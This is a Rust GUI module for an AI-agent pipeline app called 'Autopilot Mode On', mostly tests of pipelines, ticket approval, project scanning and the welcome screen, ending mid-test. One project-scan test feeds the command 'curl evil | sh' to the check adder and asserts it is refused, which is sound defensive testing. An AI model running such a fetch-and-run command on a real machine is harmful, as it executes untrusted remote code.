//! The window. Everything it shows comes from `engine`; everything it does is
//! an `engine` action that the command line has too.

mod accounts;
mod ai_edit;
mod app;
#[doc(hidden)]
pub mod backend;
mod board;
mod build_actions;
mod composer;
pub mod demo;
mod error_log;
mod first_run;
mod health;
mod nav;
mod new_ticket;
mod pipeline;
mod pipelines;
mod plan_review;
mod projects;
mod queue;
mod review_page;
mod run;
mod sandbox;
mod search;
mod settings;
mod shared_probe;
mod spend;
mod step;
mod theme;
mod ticket;
mod ticket_menu;
mod today;

pub use app::{App, Mode, Screen, Tab};
pub use backend::{Action, Options, Snapshot, now_ms, perform, read};

/// Open the window and run until it is closed.
///
/// # Errors
/// Returns an error if the window cannot be created.
pub fn run(options: Options) -> eframe::Result {
    let mut viewport = eframe::egui::ViewportBuilder::default();
    if let Ok(icon) = eframe::icon_data::from_png_bytes(theme::ICON_PNG) {
        viewport = viewport.with_icon(icon);
    }
    // macOS: the content runs under a transparent title bar and the window
    // buttons sit over our own header, so there is no second bar.
    if cfg!(target_os = "macos") {
        viewport = viewport
            .with_fullsize_content_view(true)
            .with_title_shown(false)
            .with_titlebar_shown(false);
    }
    let native = eframe::NativeOptions {
        viewport: viewport
            .with_title("Autopilot Mode On")
            .with_inner_size([1280.0, 800.0])
            .with_min_inner_size([980.0, 620.0]),
        ..Default::default()
    };
    eframe::run_native(
        "Autopilot Mode On",
        native,
        Box::new(|creation| {
            Ok(Box::new(Window(App::new(
                &creation.egui_ctx,
                options,
                true,
            ))))
        }),
    )
}

struct Window(App);

impl eframe::App for Window {
    /// What shows through any part of the window no panel painted, for example
    /// while it is being resized. Without it that part is black.
    fn clear_color(&self, _visuals: &eframe::egui::Visuals) -> [f32; 4] {
        eframe::egui::Rgba::from(theme::BACKGROUND()).to_array()
    }

    fn update(&mut self, context: &eframe::egui::Context, _frame: &mut eframe::Frame) {
        self.0.ui(context);
    }
}

#[cfg(test)]
mod tests {
    use autopilot_core::Step;
    use eframe::egui;

    use super::*;

    fn frame(app: &mut App, context: &egui::Context) {
        let input = egui::RawInput {
            screen_rect: Some(egui::Rect::from_min_size(
                egui::pos2(0.0, 0.0),
                egui::vec2(1500.0, 920.0),
            )),
            ..Default::default()
        };
        let _ = context.run(input, |context| app.ui(context));
    }

    // Invariant: a new pipeline can start empty, shows only the steps it has,
    // is deleted without touching the built-ins, and a copy keeps the owner's
    // saved steps. A page that listed all six steps for every pipeline, or a
    // copy that dropped saved steps, would show or run something the owner did
    // not choose.
    #[test]
    fn a_pipeline_is_made_empty_copied_with_its_saved_steps_and_deleted() {
        let directory = tempfile::tempdir().unwrap();
        let options = Options {
            data_dir: directory.path().join("data"),
            profile: directory.path().join("profile.toml"),
            view: None,
            ticket: None,
        };
        backend::AgentChoice::Practice.save(&options.data_dir);
        let context = egui::Context::default();
        let mut app = App::new(&context, options.clone(), false);
        app.mode = Mode::Pipelines;
        frame(&mut app, &context);
        app.create_pipeline("small", None);
        let profile = app.profile.as_ref().unwrap();
        let small = profile.pipeline("small").unwrap();
        let running: Vec<Step> = Step::ALL
            .into_iter()
            .filter(|step| small.mode(*step) != autopilot_profile::StepMode::Off)
            .collect();
        assert_eq!(running, [Step::Understand]);
        assert_eq!(app.pipeline_selected.as_deref(), Some("small"));
        frame(&mut app, &context);

        let slot = autopilot_engine::free_custom_slot(app.profile.as_ref().unwrap()).unwrap();
        autopilot_engine::set_custom_step(&options.profile, slot, "Security", "Look for holes.")
            .unwrap();
        app.profile = autopilot_engine::load_profile(&options.profile).map_err(|e| e.to_string());
        let mut modes: Vec<(Step, autopilot_profile::StepMode)> = Step::ALL
            .iter()
            .map(|step| (*step, autopilot_profile::StepMode::On))
            .collect();
        modes.push((slot, autopilot_profile::StepMode::On));
        app.write_pipeline_for_test("secure", &modes);
        app.duplicate_pipeline("secure");
        let copy = app
            .profile
            .as_ref()
            .unwrap()
            .pipeline("secure-copy")
            .unwrap();
        assert_eq!(copy.custom_steps(), [slot]);

        app.delete_selected("secure-copy");
        assert!(
            app.profile
                .as_ref()
                .unwrap()
                .pipeline("secure-copy")
                .is_none()
        );
        app.delete_selected("full");
        assert_eq!(app.pipeline_notice.as_ref().map(|n| n.0), Some(false));
        assert!(app.profile.as_ref().unwrap().pipeline("full").is_some());
        frame(&mut app, &context);
    }

    // Invariant: a step's chat uses the cheap model unless the ticket is high
    // in complexity or the question is long. A change that always chose the
    // strong model would spend on every short question.
    #[test]
    fn the_chat_uses_the_cheap_model_unless_the_question_is_hard() {
        use autopilot_core::Complexity;
        assert_eq!(backend::chat_model(None, "why?"), "haiku");
        assert_eq!(
            backend::chat_model(Some(Complexity::Medium), "why?"),
            "haiku"
        );
        assert_eq!(
            backend::chat_model(Some(Complexity::High), "why?"),
            "sonnet"
        );
        assert_eq!(
            backend::chat_model(Some(Complexity::Low), &"x".repeat(301)),
            "sonnet"
        );
    }

    // Invariant: every screen builds for every ticket state (running, waiting
    // for the owner, failed) and for an empty window, without panicking.
    #[test]
    fn every_screen_builds_for_every_ticket_state() {
        let directory = tempfile::tempdir().unwrap();
        let options = Options {
            data_dir: directory.path().join("data"),
            profile: directory.path().join("profile.toml"),
            view: None,
            ticket: None,
        };
        backend::AgentChoice::Practice.save(&options.data_dir);
        let context = egui::Context::default();
        let mut app = App::new(&context, options.clone(), false);
        for mode in [
            Mode::Today,
            Mode::Board,
            Mode::Review,
            Mode::Health,
            Mode::Projects,
            Mode::Pipelines,
            Mode::NewTicket,
            Mode::Asking,
            Mode::Checks,
            Mode::Look,
            Mode::Design,
            Mode::Watch,
            Mode::Cost,
            Mode::Accounts,
            Mode::Sandbox,
        ] {
            app.mode = mode;
            frame(&mut app, &context);
        }
        for state in [
            sandbox::Probe::Running,
            sandbox::Probe::Ready,
            sandbox::Probe::Refused("this machine is missing: bwrap".into()),
        ] {
            app.sandbox = state;
            frame(&mut app, &context);
        }
        demo::seed(&options.data_dir, now_ms()).unwrap();
        app.set_snapshot(read(&options));
        assert_eq!(app.snapshot.tickets.len(), 3);
        app.mode = Mode::Today;
        frame(&mut app, &context);
        for index in 0..3 {
            let id = app.snapshot.tickets[index].id.clone();
            app.open(&id);
            app.mode = Mode::PlanReview;
            frame(&mut app, &context);
            app.mode = Mode::Watch;
            frame(&mut app, &context);
            for step in Step::ALL {
                app.screen = Screen::Step(step);
                for tab in [Tab::Summary, Tab::Output, Tab::Log, Tab::Changes] {
                    app.tab = tab;
                    frame(&mut app, &context);
                }
            }
        }
        for advanced in [false, true] {
            app.advanced = advanced;
            app.mode = Mode::Design;
            frame(&mut app, &context);
        }
    }

    // Invariant: a click in the window is an engine action. Approving the
    // waiting sample ticket lets Understand pass, and the next read shows it.
    #[test]
    fn approving_a_waiting_ticket_goes_through_the_engine() {
        let directory = tempfile::tempdir().unwrap();
        let options = Options {
            data_dir: directory.path().join("data"),
            profile: directory.path().join("profile.toml"),
            view: None,
            ticket: None,
        };
        backend::AgentChoice::Practice.save(&options.data_dir);
        demo::seed(&options.data_dir, now_ms()).unwrap();
        let id = autopilot_core::TicketId::from("demo-heartbeat");
        let before = read(&options);
        let waiting = before.tickets.iter().find(|view| view.id == id).unwrap();
        assert_eq!(waiting.badge, autopilot_engine::Badge::NeedsYou);
        let outcome = perform(
            &options,
            &Action::Decide {
                ticket: id.clone(),
                approve: true,
                always: false,
            },
        );
        assert_eq!(outcome, Ok("Approved".to_owned()), "{outcome:?}");
        let after = read(&options);
        let settled = after.tickets.iter().find(|view| view.id == id).unwrap();
        assert_ne!(settled.badge, autopilot_engine::Badge::NeedsYou);
    }

    // Invariant: pressing A on Today approves the waiting ticket through the
    // engine. A change that lost the key handler or the page check would leave
    // the ticket waiting; the engine test above does not go through the keys.
    #[test]
    fn the_a_key_approves_the_waiting_ticket_on_today() {
        let directory = tempfile::tempdir().unwrap();
        let options = Options {
            data_dir: directory.path().join("data"),
            profile: directory.path().join("profile.toml"),
            view: None,
            ticket: None,
        };
        backend::AgentChoice::Practice.save(&options.data_dir);
        demo::seed(&options.data_dir, now_ms()).unwrap();
        let context = egui::Context::default();
        let mut app = App::new(&context, options.clone(), false);
        app.set_snapshot(read(&options));
        app.mode = Mode::Today;
        let id = autopilot_core::TicketId::from("demo-heartbeat");
        let queued = today::queue(&app.snapshot.tickets);
        assert_eq!(queued[0].id, id, "asking tickets lead the queue");
        let press = egui::Event::Key {
            key: egui::Key::A,
            physical_key: Some(egui::Key::A),
            pressed: true,
            repeat: false,
            modifiers: egui::Modifiers::NONE,
        };
        let input = egui::RawInput {
            screen_rect: Some(egui::Rect::from_min_size(
                egui::pos2(0.0, 0.0),
                egui::vec2(1500.0, 920.0),
            )),
            events: vec![press],
            ..Default::default()
        };
        let _ = context.run(input, |context| app.ui(context));
        for _ in 0..100 {
            frame(&mut app, &context);
            if app.notice.is_some() {
                break;
            }
            std::thread::sleep(std::time::Duration::from_millis(50));
        }
        assert_eq!(app.notice, Some((true, "Approved".to_owned())));
        app.set_snapshot(read(&options));
        let settled = app
            .snapshot
            .tickets
            .iter()
            .find(|view| view.id == id)
            .unwrap();
        assert_ne!(settled.badge, autopilot_engine::Badge::NeedsYou);
    }

    // Invariant: the Timezone ticket page shows round 1 failed on protected
    // paths and round 2 live, and the page builds with the drawer open and
    // closed. The data is what the page paints, so a change that dropped a
    // round from the view would fail here.
    #[test]
    fn the_timezone_ticket_shows_round_one_failed_and_round_two_live() {
        let directory = tempfile::tempdir().unwrap();
        let options = Options {
            data_dir: directory.path().join("data"),
            profile: directory.path().join("profile.toml"),
            view: None,
            ticket: None,
        };
        backend::AgentChoice::Practice.save(&options.data_dir);
        demo::seed(&options.data_dir, now_ms()).unwrap();
        let context = egui::Context::default();
        let mut app = App::new(&context, options.clone(), false);
        app.set_snapshot(read(&options));
        let id = autopilot_core::TicketId::from("demo-timezone");
        let view = app.ticket(&id).unwrap().clone();
        assert_eq!(view.rounds.len(), 2);
        let first = view.rounds[0].failure().expect("round 1 failed");
        assert!(first.note.contains("protected path"), "{}", first.note);
        assert!(
            view.rounds[1].failure().is_none(),
            "round 2 has no failure yet"
        );
        app.open(&id);
        frame(&mut app, &context);
        app.screen = Screen::Step(Step::BuildCheck);
        frame(&mut app, &context);
    }

    // Invariant: toggling Plan's switch collects an edit, shows no change on
    // disk until Save, and Save writes `ask_after` to profile.toml so a fresh
    // read of the file sees it. Design stays locked: its edit is ignored.
    #[test]
    fn toggling_plans_switch_and_saving_writes_profile_toml() {
        let directory = tempfile::tempdir().unwrap();
        let options = Options {
            data_dir: directory.path().join("data"),
            profile: directory.path().join("profile.toml"),
            view: None,
            ticket: None,
        };
        backend::AgentChoice::Practice.save(&options.data_dir);
        let context = egui::Context::default();
        let mut app = App::new(&context, options.clone(), false);
        app.mode = Mode::Asking;
        frame(&mut app, &context);
        let before = autopilot_engine::load_profile(&options.profile)
            .unwrap()
            .step(Step::Plan)
            .unwrap()
            .ask_after;
        app.ask_edits.insert(Step::Plan, !before);
        app.ask_edits.insert(Step::Design, false);
        assert_eq!(app.ask_changes(), vec![(Step::Plan, !before)]);
        assert!(!options.profile.exists(), "nothing is written before Save");
        frame(&mut app, &context);
        app.save_asking();
        let after = autopilot_engine::load_profile(&options.profile).unwrap();
        assert_eq!(after.step(Step::Plan).unwrap().ask_after, !before);
        assert!(app.ask_edits.is_empty());
    }

    // Invariant: every `--view` name the usage text lists opens its screen, so
    // a script or a screenshot run that names one does not land on the default
    // page. A name that stops working fails here instead of opening silently
    // on the wrong page.
    #[test]
    fn every_view_name_opens_its_screen() {
        let directory = tempfile::tempdir().unwrap();
        let options = Options {
            data_dir: directory.path().join("data"),
            profile: directory.path().join("profile.toml"),
            view: None,
            ticket: None,
        };
        backend::AgentChoice::Practice.save(&options.data_dir);
        demo::seed(&options.data_dir, now_ms()).unwrap();
        let context = egui::Context::default();
        let cases = [
            ("today", Mode::Today),
            ("inbox", Mode::Today),
            ("new", Mode::NewTicket),
            ("plan", Mode::PlanReview),
            ("settings", Mode::Asking),
            ("asking", Mode::Asking),
            ("design", Mode::Design),
            ("checks", Mode::Checks),
            ("look", Mode::Look),
            ("sandbox", Mode::Sandbox),
            ("board", Mode::Board),
            ("projects", Mode::Projects),
            ("pipelines", Mode::Pipelines),
            ("health", Mode::Health),
            ("review", Mode::Review),
            ("cost", Mode::Cost),
            ("accounts", Mode::Accounts),
            ("run", Mode::Watch),
            ("step", Mode::Watch),
        ];
        for (view, expected) in cases {
            let mut shown = options.clone();
            shown.view = Some(view.to_owned());
            let mut app = App::new(&context, shown.clone(), false);
            app.mode = Mode::Board;
            app.set_snapshot(read(&shown));
            assert_eq!(app.mode, expected, "--view {view}");
        }
    }

    // Invariant: an install with no tickets and no chosen folder opens First
    // run; a chosen folder or a ticket ends it. Before the first snapshot it
    // is not first run, so the page does not flash while data loads.
    #[test]
    fn an_empty_data_directory_opens_first_run() {
        let directory = tempfile::tempdir().unwrap();
        let options = Options {
            data_dir: directory.path().join("data"),
            profile: directory.path().join("profile.toml"),
            view: None,
            ticket: None,
        };
        backend::AgentChoice::Practice.save(&options.data_dir);
        let context = egui::Context::default();
        let mut app = App::new(&context, options.clone(), false);
        assert!(!app.is_first_run(), "nothing has loaded yet");
        app.set_snapshot(read(&options));
        assert!(app.is_first_run());
        app.mode = Mode::Today;
        frame(&mut app, &context);
        // Choosing the folder is a step of the welcome, not its end.
        backend::save_workspace(&options.data_dir, Some(directory.path()));
        app.saved_workspace = backend::saved_workspace(&options.data_dir);
        assert!(app.is_first_run());
        // An install that already has a folder predates the welcome.
        let mut older = App::new(&context, options.clone(), false);
        older.set_snapshot(read(&options));
        assert!(!older.is_first_run());
    }

    fn drawn_text(app: &mut App, context: &egui::Context) -> String {
        let input = egui::RawInput {
            screen_rect: Some(egui::Rect::from_min_size(
                egui::pos2(0.0, 0.0),
                egui::vec2(1500.0, 920.0),
            )),
            ..Default::default()
        };
        let output = context.run(input, |context| app.ui(context));
        let mut text = String::new();
        for clipped in output.shapes {
            if let egui::Shape::Text(shape) = clipped.shape {
                text.push_str(shape.galley.text());
                text.push('\n');
            }
        }
        text
    }

    // Invariant: while the welcome is open it is the whole window: every step
    // shows its own content and none of the navigation. A change that draws
    // the navigation or skips a step would show a ticket screen first.
    #[test]
    fn the_welcome_is_full_screen_with_four_steps() {
        let directory = tempfile::tempdir().unwrap();
        let options = Options {
            data_dir: directory.path().join("data"),
            profile: directory.path().join("profile.toml"),
            view: None,
            ticket: None,
        };
        let context = egui::Context::default();
        let mut app = App::new(&context, options.clone(), false);
        app.set_snapshot(read(&options));
        for (step, wanted) in [
            (0, "Pick your agent"),
            (1, "Connect your tools"),
            (2, "Set up your environment"),
            (3, "Pick a look"),
        ] {
            app.welcome_step = step;
            let text = drawn_text(&mut app, &context);
            assert!(text.contains(wanted), "step {step} shows {wanted}: {text}");
            assert!(!text.contains("Inbox"), "no navigation in the welcome");
        }
        app.welcome_step = 0;
        let text = drawn_text(&mut app, &context);
        assert!(text.contains("API key"), "the API key is explained");
    }

    // Invariant: the first screen is remembered once dealt with; a fresh
    // start in the same data folder never shows it again.
    #[test]
    fn the_first_screen_shows_once_ever() {
        let directory = tempfile::tempdir().unwrap();
        let options = Options {
            data_dir: directory.path().join("data"),
            profile: directory.path().join("profile.toml"),
            view: None,
            ticket: None,
        };
        let context = egui::Context::default();
        let mut app = App::new(&context, options.clone(), false);
        app.set_snapshot(read(&options));
        assert!(app.is_first_run());
        backend::mark_welcomed(&options.data_dir);
        let mut again = App::new(&context, options.clone(), false);
        again.set_snapshot(read(&options));
        assert!(!again.is_first_run());
    }

    // Invariant: a ticket started with no project runs the ask-only pipeline,
    // so Plan is skipped and cannot be made; one with a project runs `full`.
    // Deriving ask-only from a missing folder later would change old tickets.
    #[test]
    fn a_ticket_with_no_project_runs_ask_only_and_cannot_be_planned() {
        let directory = tempfile::tempdir().unwrap();
        let options = Options {
            data_dir: directory.path().join("data"),
            profile: directory.path().join("profile.toml"),
            view: None,
            ticket: None,
        };
        backend::AgentChoice::Practice.save(&options.data_dir);
        perform(
            &options,
            &Action::Start {
                title: "Just a question".into(),
                description: "What does the export do?".into(),
                attachments: Vec::new(),
                workspace: None,
                pipeline: None,
            },
        )
        .unwrap();
        let view = read(&options).tickets[0].clone();
        assert_eq!(view.pipeline.as_ref().unwrap().0, "ask-only");
        assert!(matches!(
            view.step(Step::Plan).unwrap().state,
            autopilot_pipeline::StepState::Skipped(_)
        ));
        let outcome = perform(&options, &Action::MakePlan(view.id.clone()));
        assert!(outcome.is_err(), "{outcome:?}");
        assert!(read(&options).problem.is_none(), "the history stays valid");
    }

    // Invariant: retrying with more turns doubles the cap for that ticket
    // alone, up to the limit, and then says so. A project-wide change would
    // raise spend for every ticket; no cap would loop forever.
    #[test]
    fn more_turns_raise_one_tickets_cap_up_to_the_limit() {
        let directory = tempfile::tempdir().unwrap();
        let options = Options {
            data_dir: directory.path().join("data"),
            profile: directory.path().join("profile.toml"),
            view: None,
            ticket: None,
        };
        demo::seed(&options.data_dir, now_ms()).unwrap();
        let one = autopilot_core::TicketId::from("demo-heartbeat");
        let two = autopilot_core::TicketId::from("demo-timezone");
        let turns = |ticket: &autopilot_core::TicketId| {
            autopilot_engine::effective_overrides(&options.data_dir, ticket, Step::Understand)
                .unwrap()
                .turns
        };
        assert_eq!(turns(&one), None);
        backend::raise_turns(&options, &one).unwrap();
        assert_eq!(turns(&one), Some(40));
        assert_eq!(turns(&two), None, "a sibling keeps the project cap");
        for _ in 0..3 {
            backend::raise_turns(&options, &one).unwrap();
        }
        assert_eq!(turns(&one), Some(200));
        assert!(backend::raise_turns(&options, &one).is_err());
    }

    // Invariant: a folder a ticket used shows up as a project the profile does
    // not know, adding it writes one entry, the rules the owner saves are read
    // back from the data folder (and not from the project), and a refused
    // rules file leaves the saved one as it was. Grouping by folder name would
    // merge two projects that share it.
    #[test]
    fn projects_list_register_and_keep_rules_outside_the_folder() {
        let directory = tempfile::tempdir().unwrap();
        let options = Options {
            data_dir: directory.path().join("data"),
            profile: directory.path().join("profile.toml"),
            view: None,
            ticket: None,
        };
        let project = directory.path().join("work").join("app");
        std::fs::create_dir_all(&project).unwrap();
        let context = egui::Context::default();
        let mut app = App::new(&context, options.clone(), false);
        app.mode = Mode::Projects;
        frame(&mut app, &context);
        app.add_project(&project);
        let path = app.project_selected.clone().unwrap();
        assert_eq!(app.profile.as_ref().unwrap().projects.len(), 1);
        assert!(app.profile.as_ref().unwrap().project(&path).is_some());
        app.rules_text = "Prefer short functions.".into();
        app.save_project_rules();
        assert_eq!(app.rules_notice.as_ref().map(|n| n.0), Some(true));
        app.rules_text = "x".repeat(autopilot_engine::MAX_RULES_BYTES + 1);
        app.save_project_rules();
        assert_eq!(app.rules_notice.as_ref().map(|n| n.0), Some(false));
        app.revert_rules();
        assert_eq!(app.rules_text, "Prefer short functions.");
        assert_eq!(std::fs::read_dir(&project).unwrap().count(), 0);
        frame(&mut app, &context);
        // Two folders that share a name are two rows.
        let other = directory.path().join("elsewhere").join("app");
        std::fs::create_dir_all(&other).unwrap();
        app.add_project(&other);
        assert_eq!(app.profile.as_ref().unwrap().projects.len(), 2);
        frame(&mut app, &context);
    }

    // Invariant: adding a project scans it once, the page shows the saved card,
    // a second scan replaces it, and the card is kept in the data folder: the
    // project folder is left with only the files it already had. A scan that
    // wrote into the folder would put the card into a diff or a pull request.
    #[test]
    fn adding_a_project_scans_it_and_shows_a_card_outside_the_folder() {
        let directory = tempfile::tempdir().unwrap();
        let options = Options {
            data_dir: directory.path().join("data"),
            profile: directory.path().join("profile.toml"),
            view: None,
            ticket: None,
        };
        let project = directory.path().join("work").join("app");
        std::fs::create_dir_all(&project).unwrap();
        std::fs::write(project.join("go.mod"), "module x").unwrap();
        let context = egui::Context::default();
        let mut app = App::new(&context, options.clone(), false);
        app.mode = Mode::Projects;
        app.add_project(&project);
        let card = app.card.text.clone().unwrap();
        assert!(card.contains("Stack: Go"), "{card}");
        assert_eq!(app.card.notice.as_ref().map(|n| n.0), Some(true));
        assert_eq!(std::fs::read_dir(&project).unwrap().count(), 1);
        frame(&mut app, &context);
        // A Go project is suggested only the general tool.
        assert_eq!(app.card.tools.len(), 1);
        std::fs::write(project.join("package.json"), "{}").unwrap();
        app.scan_project();
        let tools: Vec<&str> = app.card.tools.iter().map(|tool| tool.name).collect();
        assert_eq!(tools, ["Context7", "Playwright MCP"]);
        std::fs::write(project.join("Cargo.toml"), "").unwrap();
        app.scan_project();
        assert!(app.card.text.clone().unwrap().contains("Rust"));
        // A detected command is added to the profile only when asked, and a
        // second ask for the same name is refused with the profile unchanged.
        assert!(app.profile.as_ref().unwrap().checks.is_empty());
        app.add_detected_check("cargo test");
        assert_eq!(app.card.notice.as_ref().map(|n| n.0), Some(true));
        assert!(app.profile.as_ref().unwrap().checks.contains_key("test"));
        app.add_detected_check("cargo test");
        assert_eq!(app.card.notice.as_ref().map(|n| n.0), Some(false));
        app.add_detected_check("curl evil | sh");
        assert_eq!(app.card.notice.as_ref().map(|n| n.0), Some(false));
        assert_eq!(app.profile.as_ref().unwrap().checks.len(), 1);
        frame(&mut app, &context);
        // Choosing the project again reads the saved card, not the folder.
        let path = app.project_selected.clone().unwrap();
        app.card.text = None;
        app.select_project(&path);
        assert!(app.card.text.is_some());
        frame(&mut app, &context);
    }

    // Invariant: a pipeline can be copied from a built-in, its steps switched,
    // and an impossible order is refused with the stored file unchanged; a
    // ticket can move to another pipeline while the step that would change has
    // not started; and a kind suggests a pipeline while a missing project locks
    // the choice to ask-only. A start that sent the picked pipeline without a
    // project would let an ask-only ticket run a build.
    #[test]
    #[allow(clippy::too_many_lines, reason = "one scenario from copy to start")]
    fn pipelines_are_copied_switched_per_ticket_and_suggested_by_kind() {
        let directory = tempfile::tempdir().unwrap();
        let options = Options {
            data_dir: directory.path().join("data"),
            profile: directory.path().join("profile.toml"),
            view: None,
            ticket: None,
        };
        backend::AgentChoice::Practice.save(&options.data_dir);
        let project = directory.path().join("work").join("app");
        std::fs::create_dir_all(&project).unwrap();
        let context = egui::Context::default();
        let mut app = App::new(&context, options.clone(), false);
        app.mode = Mode::Pipelines;
        frame(&mut app, &context);
        app.duplicate_pipeline("bug-fix");
        let copy = app.pipeline_selected.clone().unwrap();
        assert_eq!(copy, "bug-fix-copy");
        assert!(app.profile.as_ref().unwrap().pipeline(&copy).is_some());
        let stored = std::fs::read_to_string(&options.profile).unwrap();
        let mut modes: Vec<(Step, autopilot_profile::StepMode)> = Step::ALL
            .iter()
            .map(|step| {
                (
                    *step,
                    app.profile
                        .as_ref()
                        .unwrap()
                        .pipeline(&copy)
                        .unwrap()
                        .mode(*step),
                )
            })
            .collect();
        for (step, mode) in &mut modes {
            if *step == Step::Plan {
                *mode = autopilot_profile::StepMode::Off;
            }
        }
        app.write_pipeline_for_test(&copy, &modes);
        assert_eq!(app.pipeline_notice.as_ref().map(|n| n.0), Some(false));
        assert_eq!(std::fs::read_to_string(&options.profile).unwrap(), stored);
        frame(&mut app, &context);

        // Per ticket: a ticket in a project starts on full, then moves.
        perform(
            &options,
            &Action::Start {
                title: "T".into(),
                description: "Show the time".into(),
                attachments: Vec::new(),
                workspace: Some(project.clone()),
                pipeline: None,
            },
        )
        .unwrap();
        let id = read(&options).tickets[0].id.clone();
        assert_eq!(
            read(&options).tickets[0].pipeline.as_ref().unwrap().0,
            "full"
        );
        // Clarify already asked its question, so a pipeline that turns it off
        // is refused and the ticket keeps what it had.
        let refused = perform(
            &options,
            &Action::ChoosePipeline {
                ticket: id.clone(),
                name: "quick-change".into(),
            },
        );
        assert!(refused.is_err(), "{refused:?}");
        assert_eq!(
            read(&options).tickets[0].pipeline.as_ref().unwrap().0,
            "full"
        );
        perform(
            &options,
            &Action::ChoosePipeline {
                ticket: id.clone(),
                name: "bug-fix".into(),
            },
        )
        .unwrap();
        let view = read(&options).tickets[0].clone();
        assert_eq!(view.pipeline.as_ref().unwrap().0, "bug-fix");
        assert!(matches!(
            view.step(Step::Design).unwrap().state,
            autopilot_pipeline::StepState::Skipped(_)
        ));
        assert!(
            perform(
                &options,
                &Action::ChoosePipeline {
                    ticket: id,
                    name: "no-such".into(),
                },
            )
            .is_err()
        );

        // New ticket: the kind suggests, no project locks.
        app.mode = Mode::NewTicket;
        app.home.workspace = Some(project);
        app.kind = new_ticket::Kind::Bug;
        frame(&mut app, &context);
        assert_eq!(app.home.pipeline.as_deref(), Some("bug-fix"));
        app.kind = new_ticket::Kind::Ask;
        frame(&mut app, &context);
        assert_eq!(app.home.pipeline.as_deref(), Some("ask-only"));
        app.home.workspace = None;
        app.home.description = "x".into();
        let Action::Start { pipeline, .. } = app.home.start_action() else {
            panic!("a start");
        };
        assert_eq!(pipeline, None, "no project means no pipeline is sent");
    }

    // Invariant: the practice agent drafts a pipeline that the engine accepts,
    // the draft is not stored until it is saved, and saving writes it to
    // profile.toml where a fresh read finds it. The draft for the Claude
    // choice is greyed, since a live draft spends money.
    #[test]
    fn a_pipeline_draft_is_shown_then_saved_only_on_request() {
        let directory = tempfile::tempdir().unwrap();
        let options = Options {
            data_dir: directory.path().join("data"),
            profile: directory.path().join("profile.toml"),
            view: None,
            ticket: None,
        };
        backend::AgentChoice::Practice.save(&options.data_dir);
        let context = egui::Context::default();
        let mut app = App::new(&context, options.clone(), false);
        app.mode = Mode::Pipelines;
        app.draft_text = "a small change that needs no questions".into();
        let draft = backend::draft_pipeline(&options, &app.draft_text, None).unwrap();
        assert_eq!(draft.name, "practice-draft");
        assert_eq!(
            draft.pipeline.mode(Step::Clarify),
            autopilot_profile::StepMode::Off
        );
        assert!(!options.profile.exists(), "a draft stores nothing");
        app.draft = Some(draft.clone());
        frame(&mut app, &context);
        let saved = autopilot_engine::save_draft(&options.profile, &draft).unwrap();
        assert!(saved.pipeline("practice-draft").is_some());
        let reread = autopilot_engine::load_profile(&options.profile).unwrap();
        assert!(reread.pipeline("practice-draft").is_some());
    }

    // Invariant: the agent can add a step the owner never typed, and the draft
    // can be changed afterwards. The step is saved with the pipeline, shows
    // by the name the owner sees, and the page still builds with it. Without
    // this, "add a security review" would stay a thing only the CLI could do.
    #[test]
    fn the_agent_adds_a_custom_step_and_the_page_shows_it() {
        let directory = tempfile::tempdir().unwrap();
        let options = Options {
            data_dir: directory.path().join("data"),
            profile: directory.path().join("profile.toml"),
            view: None,
            ticket: None,
        };
        backend::AgentChoice::Practice.save(&options.data_dir);
        let context = egui::Context::default();
        let mut app = App::new(&context, options.clone(), false);
        app.mode = Mode::Pipelines;
        let draft = backend::draft_pipeline(&options, "add a security review", None).unwrap();
        assert_eq!(draft.new_steps.len(), 1);
        assert!(!options.profile.exists(), "a draft stores nothing");
        app.draft = Some(draft.clone());
        frame(&mut app, &context);
        let saved = autopilot_engine::save_draft(&options.profile, &draft).unwrap();
        let step = Step::Custom(1);
        assert!(saved.custom_step(step).is_some());
        assert_eq!(saved.pipeline(&draft.name).unwrap().custom_steps(), [step]);
        app.profile = Ok(saved);
        app.pipeline_selected = Some(draft.name.clone());
        app.step_open = Some(step);
        frame(&mut app, &context);
    }

    // Invariant: a plan can be sent back with a note (the step stops as
    // interrupted and can be planned again) and approved with a corrected
    // assumption, which the ticket view then shows. The window only sends the
    // engine's decisions; a click that sent a plain approval instead would drop
    // the correction.
    #[test]
    fn a_plan_is_sent_back_with_a_note_and_approved_with_a_correction() {
        let directory = tempfile::tempdir().unwrap();
        let options = Options {
            data_dir: directory.path().join("data"),
            profile: directory.path().join("profile.toml"),
            view: None,
            ticket: None,
        };
        backend::AgentChoice::Practice.save(&options.data_dir);
        perform(
            &options,
            &Action::Start {
                title: "Plan me".into(),
                description: "Add an export option".into(),
                attachments: Vec::new(),
                workspace: Some(directory.path().to_path_buf()),
                pipeline: None,
            },
        )
        .unwrap();
        let id = read(&options).tickets[0].id.clone();
        if read(&options).tickets[0].asking.is_some() {
            perform(&options, &Action::AcceptDefaults { ticket: id.clone() }).unwrap();
        }
        perform(&options, &Action::MakePlan(id.clone())).unwrap();
        perform(
            &options,
            &Action::SendBack {
                ticket: id.clone(),
                note: "mention the CSV header".into(),
            },
        )
        .unwrap();
        let view = read(&options).tickets[0].clone();
        assert!(matches!(
            view.step(Step::Plan).unwrap().state,
            autopilot_pipeline::StepState::Interrupted(_)
        ));
        perform(&options, &Action::RerunPlan(id.clone())).unwrap();
        perform(
            &options,
            &Action::ApproveCorrected {
                ticket: id.clone(),
                corrections: vec![autopilot_core::AssumptionCorrection {
                    assumption: "UTF-8".into(),
                    correction: "Latin-1".into(),
                }],
            },
        )
        .unwrap();
        let view = read(&options).tickets[0].clone();
        assert_eq!(view.corrections[0].correction, "Latin-1");
        let context = egui::Context::default();
        let mut app = App::new(&context, options.clone(), false);
        app.set_snapshot(read(&options));
        app.open(&id);
        app.mode = Mode::PlanReview;
        frame(&mut app, &context);
        app.mode = Mode::Watch;
        frame(&mut app, &context);
    }

    // Invariant: the Health page shows runs of a pipeline from the recorded
    // histories and says "not reported" for usage no adapter reported. It must
    // not draw a zero for a missing figure. The demo tickets carry no usage, so
    // every step's usage is missing.
    #[test]
    fn health_counts_runs_and_never_shows_a_missing_figure_as_zero() {
        let directory = tempfile::tempdir().unwrap();
        let options = Options {
            data_dir: directory.path().join("data"),
            profile: directory.path().join("profile.toml"),
            view: None,
            ticket: None,
        };
        backend::AgentChoice::Practice.save(&options.data_dir);
        demo::seed(&options.data_dir, now_ms()).unwrap();
        let metrics = autopilot_engine::pipeline_metrics(&options.data_dir, "full", 5).unwrap();
        assert_eq!(
            metrics.tickets, 3,
            "demo tickets have no pipeline choice, so they ran full"
        );
        let understand = &metrics.steps[0];
        assert!(understand.runs >= 1);
        assert_eq!(understand.reported, 0);
